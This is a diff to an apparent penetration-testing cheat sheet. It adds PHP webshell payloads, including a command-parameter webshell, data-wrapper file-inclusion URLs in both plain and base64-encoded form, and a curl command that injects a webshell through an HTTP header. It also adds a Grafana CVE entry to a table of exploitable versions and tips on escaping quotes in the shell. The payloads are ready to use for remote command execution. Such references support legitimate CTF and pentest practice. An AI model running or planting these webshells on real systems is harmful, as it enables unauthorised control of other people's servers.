@@ -96,8 +96,17 @@ POST request with json type
 .  
 
 ### Webshells
-	<?php system("whoami")?>
+	<?php echo system("whoami"); ?>
 PHP webshell  
+
+	<?php echo system($_GET['cmd']); ?>
+parameter webshell: `http://URL/vulnerable.php?cmd=whoami` or `http://URL/index.php?page=vulnerable&cmd=whoami`  
+
+	http://URL/vulnerable.php?page=data://test/plain,<?php$20echo%20system('whoami');?>
+data wrapper  
+
+	http://URL/vulnerable.php?page=data://test/plain,base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
+base64 encoded data wrapper  
 
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
@@ -370,3 +379,10 @@ GET/POST parameters
 |pkexec||CVE-2021-4034|https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures|
 |vsftpd|2.3.4|CVE-2011-2523|https://www.exploit-db.com/exploits/49757|
 |Apache|2.4.49|CVE-2021-41773|see url path traversal|
+|Grafana|8.3.0 and more|CVE-2021-43798|https://www.vulncheck.com/blog/grafana-cve-2021-43798|
+
+## Quote escapes
+	curl -H 'Custom-Header: <?php echo system($_GET['\''cmd'\'']); ?>'
+Use `''` to escape all other special characters. Close quote and `\'` and reopen to include one single quote  
+
+For double quotes, `$`, `` ` ``, `"`, `\`, `!` must be escaped with backslash.  
